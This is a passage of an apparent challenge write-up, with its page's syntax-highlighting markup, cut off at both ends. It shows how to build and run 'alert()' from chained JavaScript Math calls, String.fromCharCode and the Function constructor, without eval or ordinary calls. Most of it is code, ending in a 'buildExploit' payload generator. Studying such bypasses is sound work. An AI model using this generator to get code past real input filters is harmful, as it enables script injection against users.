<span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>You can use the function as follows:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>Math<span class="token punctuation">,</span> <span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'Math'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// Math.abs</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>Math<span class="token punctuation">,</span> <span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'l'</span><span class="token punctuation">,</span><span class="token string">'Math'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// Math.clz32</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>We can also improve the usability by organizing it as follows:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">findMathName</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">index<span class="token punctuation">,</span> char</span><span class="token punctuation">)</span> <span class="token operator">=></span>     <span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>Math<span class="token punctuation">,</span> <span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">===</span> char<span class="token punctuation">,</span> <span class="token string">'Math'</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">findMathName</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// Math.abs</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">findMathName</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// Math.clz32</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Earlier, we mentioned that we would first try to find the desired character by using the array’s length. But what if we can’t find it?</p><p>In that case, we can try another approach: finding it at a fixed index.</p><p>For example, <code>Math.LN2</code> is <code>0.69</code>, and when we pass a decimal number as an argument to <code>Array.prototype.at()</code>, it automatically rounds down to the nearest integer. So, it becomes <code>0</code>.</p><p>Suppose the original return value of <code>arr.push()</code> is 2. By wrapping it with <code>Math.LN2.valueOf(arr.push())</code>, we can convert the number back to 0, allowing us to use the first character to find the desired function name.</p><p>Here’s an example:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Math<span class="token punctuation">.</span>seeds <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>log<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>This code will make the contents of the array become <code>[&#39;a&#39;, &#39;l&#39;]</code>.</p><p>Following this approach, we can prepare a few more indices. I have prepared four:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> mapping <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token punctuation">[</span><span class="token string">'Math.LN2.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 0</span>  <span class="token punctuation">[</span><span class="token string">'Math.LOG2E.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 1</span>  <span class="token punctuation">[</span><span class="token string">'Math.E.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 2</span>  <span class="token punctuation">[</span><span class="token string">'Math.PI.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 3</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>At this point, we should be able to find all the English letters we need. But what about symbols like <code>()</code>? How do we handle those?</p><p>This is where we can recall the handy function <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode">String.fromCharCode()</a>. It can convert a number into a corresponding character string.</p><p>To access <code>String</code> from <code>Math</code>, we can simply find any string and access its constructor, like <code>Math.abs.name.constructor.fromCharCode</code>.</p><p>Now, the question becomes, how do we generate numbers?</p><p>Since we are already using Math, let’s write a searching function that tries various combinations of Math functions!</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">findTargetNumber</span><span class="token punctuation">(</span><span class="token parameter">init<span class="token punctuation">,</span> target</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> init<span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token keyword">let</span> visited <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token function">bfs</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>  <span class="token keyword">function</span> <span class="token function">bfs</span><span class="token punctuation">(</span><span class="token parameter">target</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">let</span> <span class="token punctuation">[</span>path<span class="token punctuation">,</span> current<span class="token punctuation">]</span> <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>Math<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> Math<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token keyword">continue</span>        <span class="token keyword">let</span> value <span class="token operator">=</span> Math<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token operator">?.</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Number<span class="token punctuation">.</span><span class="token function">isNaN</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">let</span> newPath <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Math.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token operator">...</span>path<span class="token punctuation">]</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">===</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> newPath          <span class="token punctuation">&#125;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>newPath<span class="token punctuation">.</span>length <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">return</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            visited<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>            queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">[</span>newPath<span class="token punctuation">,</span> value<span class="token punctuation">]</span><span class="token punctuation">)</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">findTargetNumber</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// ['Math.floor', 'Math.log2', 'Math.cosh', 'Math.clz32']</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>When we construct <code>alert</code>, the return value of the last push operation will be 5. Since the ASCII code for <code>(</code> is 40, we can obtain 40 with the following expression: <code>Math.floor(Math.log2(Math.cosh(Math.clz32(5))))</code>.</p><p>By concatenating it with the previous code, we can obtain <code>(</code>:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">log2</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">cosh</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">clz32</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Putting it all together, we can form an array with the desired characters.</p><h2><span id="3-how-to-join-the-array">3. How to join the array?</span></h2><p>To join the array elements together, we need to find an empty string to transform the array into the desired string format.</p><p>Initially, my idea was to generate a whitespace character and use <code>&quot; &quot;.trim()</code>. However, this approach would involve function calls like <code>fn().trim()</code>, which violates the rules specified in the challenge.</p><p>Fortunately, there is another way to invoke functions: <code>String.prototype.trim.call(&quot; &quot;)</code>. This method allows us to obtain an empty string.</p><p>We can utilize the method we used earlier to find <code>(</code> to find the whitespace character. Finally, we can add this sequence of function calls to achieve the desired result. Here’s an example:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Assumed we already had the array</span><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'l'</span><span class="token punctuation">,</span><span class="token string">'e'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span><span class="token string">'t'</span><span class="token punctuation">,</span><span class="token string">'('</span><span class="token punctuation">,</span><span class="token string">')'</span><span class="token punctuation">]</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>  arr<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// alert()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2><span id="4-how-to-execute-without-using-eval">4. How to execute without using eval?</span></h2><p>Besides <code>eval</code>, we can also use the function constructor, like this:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">Function</span><span class="token punctuation">(</span><span class="token string">'alert()'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>For the <code>Function</code> part, we can simply find any function and access its constructor:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token string">'alert()'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>But what about the final <code>()</code>?</p><p>Similarly, we can invoke a function in another way. For example, <code>alert.call()</code> can be written as <code>Function.prototype.call.call(alert)</code>. Therefore, the code we need is as follows:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token string">'alert()'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2><span id="5-putting-it-all-together">5. Putting it all together</span></h2><p>I have written a simple script to generate the code. Here is the complete code:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>scope<span class="token punctuation">,</span> matchFn<span class="token punctuation">,</span> initPath<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> visited <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token function">findTarget</span><span class="token punctuation">(</span>scope<span class="token punctuation">,</span> initPath<span class="token punctuation">)</span>  <span class="token comment">// return the shortest one</span>  <span class="token keyword">return</span> result<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=></span> a<span class="token punctuation">.</span>length <span class="token operator">-</span> b<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token keyword">function</span> <span class="token function">findTarget</span><span class="token punctuation">(</span><span class="token parameter">obj<span class="token punctuation">,</span> path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>visited<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span>    visited<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">const</span> list <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">of</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> item <span class="token operator">=</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span>      <span class="token keyword">const</span> newPath <span class="token operator">=</span> path <span class="token operator">?</span> path <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> key <span class="token operator">:</span> key      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">matchFn</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>newPath<span class="token punctuation">)</span>          <span class="token keyword">continue</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>item <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> item <span class="token operator">===</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">findTarget</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span> newPath<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">findTargetNumber</span><span class="token punctuation">(</span><span class="token parameter">init<span class="token punctuation">,</span> target</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> init<span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token keyword">let</span> visited <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token function">bfs</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>  <span class="token keyword">function</span> <span class="token function">bfs</span><span class="token punctuation">(</span><span class="token parameter">target</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">let</span> <span class="token punctuation">[</span>path<span class="token punctuation">,</span> current<span class="token punctuation">]</span> <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>Math<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> Math<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token keyword">continue</span>        <span class="token keyword">let</span> value <span class="token operator">=</span> Math<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token operator">?.</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Number<span class="token punctuation">.</span><span class="token function">isNaN</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">let</span> newPath <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Math.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token operator">...</span>path<span class="token punctuation">]</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">===</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> newPath          <span class="token punctuation">&#125;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>newPath<span class="token punctuation">.</span>length <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">return</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            visited<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>            queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">[</span>newPath<span class="token punctuation">,</span> value<span class="token punctuation">]</span><span class="token punctuation">)</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">buildExploit</span><span class="token punctuation">(</span><span class="token parameter">arrName<span class="token punctuation">,</span> content</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> ans <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">let</span> currentIndex <span class="token operator">=</span> <span class="token number">0</span>  <span class="token keyword">let</span> codeResult <span class="token operator">=</span> <span class="token string">''</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.pop</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">const</span> <span class="token function-variable function">findMathName</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">index<span class="token punctuation">,</span> char</span><span class="token punctuation">)</span> <span class="token operator">=></span>     <span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>Math<span class="token punctuation">,</span> <span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">===</span> char<span class="token punctuation">,</span> <span class="token string">'Math'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> char <span class="token keyword">of</span> content<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// if we can find it in the Math for the current index, use it</span>    <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token function">findMathName</span><span class="token punctuation">(</span>currentIndex<span class="token punctuation">,</span> char<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>result<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.name.at</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>      currentIndex<span class="token operator">++</span>      <span class="token keyword">continue</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> mapping <span class="token operator">=</span> <span class="token punctuation">[</span>      <span class="token punctuation">[</span><span class="token string">'Math.LN2.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 0</span>      <span class="token punctuation">[</span><span class="token string">'Math.LOG2E.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 1</span>      <span class="token punctuation">[</span><span class="token string">'Math.E.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 2</span>      <span class="token punctuation">[</span><span class="token string">'Math.PI.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 3</span>    <span class="token punctuation">]</span>    <span class="token comment">// try to find Math.fn[i] == char</span>    <span class="token keyword">let</span> found <span class="token operator">=</span> <span class="token boolean">false</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>mapping<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      result <span class="token operator">=</span> <span class="token function">findMathName</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> char<span class="token punctuation">)</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">addFunction</span><span class="token punctuation">(</span>mapping<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>result<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.name.at</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        currentIndex<span class="token operator">++</span>        found <span class="token operator">=</span> <span class="token boolean">true</span>        <span class="token keyword">break</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>found<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">continue</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// if we can't, we use integer to make a string</span>    <span class="token keyword">let</span> mathResult <span class="token operator">=</span> <span class="token function">findTargetNumber</span><span class="token punctuation">(</span>currentIndex<span class="token punctuation">,</span> char<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    mathResult<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// remember to reverse cause the order</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> row <span class="token keyword">of</span> mathResult<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.name.constructor.fromCharCode'</span><span class="token punctuation">)</span>    <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span 